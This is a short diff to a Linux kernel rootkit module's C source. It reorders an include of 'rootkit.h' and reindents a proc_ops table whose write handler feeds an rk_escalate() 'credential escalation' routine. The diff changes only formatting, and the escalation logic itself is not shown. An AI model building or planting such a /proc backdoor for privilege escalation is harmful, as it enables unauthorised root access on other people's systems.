@@ -1,10 +1,10 @@
 // SPDX-License-Identifier: GPL-2.0
+#include "rootkit.h"
 #include <linux/cred.h>
 #include <linux/fs.h>
 #include <linux/module.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
-#include "rootkit.h"
 
 /* Credential escalation */
 int rk_escalate(void)
@@ -63,11 +63,11 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf,
 }
 
 static const struct proc_ops rk_proc_ops = {
-	.proc_open    = rk_proc_open,
-	.proc_read    = seq_read,
-	.proc_write   = rk_proc_write,
-	.proc_lseek   = seq_lseek,
-	.proc_release = single_release,
+    .proc_open = rk_proc_open,
+    .proc_read = seq_read,
+    .proc_write = rk_proc_write,
+    .proc_lseek = seq_lseek,
+    .proc_release = single_release,
 };
 
 int rk_proc_init(void)
